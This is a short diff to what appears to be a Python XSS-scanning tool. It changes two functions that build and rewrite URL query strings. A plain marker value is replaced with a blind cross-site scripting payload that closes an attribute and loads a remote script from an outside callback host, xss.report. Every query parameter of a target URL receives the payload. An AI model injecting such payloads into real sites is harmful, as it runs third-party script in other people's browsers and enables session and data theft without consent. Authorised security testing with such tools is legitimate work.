@@ -10,7 +10,7 @@ def create_query(params):
     """
     query_string = ''
     for param in params:
-        pair = param + '=' + '"dalaho' + '&'
+        pair = param + '=' + '\'"><script src=https://xss.report/c/dalaho></script>' + '&'
         query_string += pair
     if query_string.endswith('&'):
         query_string = query_string[:-1]
@@ -22,7 +22,7 @@ def update_request(url):
     parsed_url = urlparse(url)
     query_params = parse_qs(parsed_url.query)
     for q in query_params:
-        query_params[q]=['"dalaho']
+        query_params[q]=['\'"><script src=https://xss.report/c/dalaho></script>']
 
     encoded_query = urlencode(query_params, doseq=True)
     new_url = urlunparse((
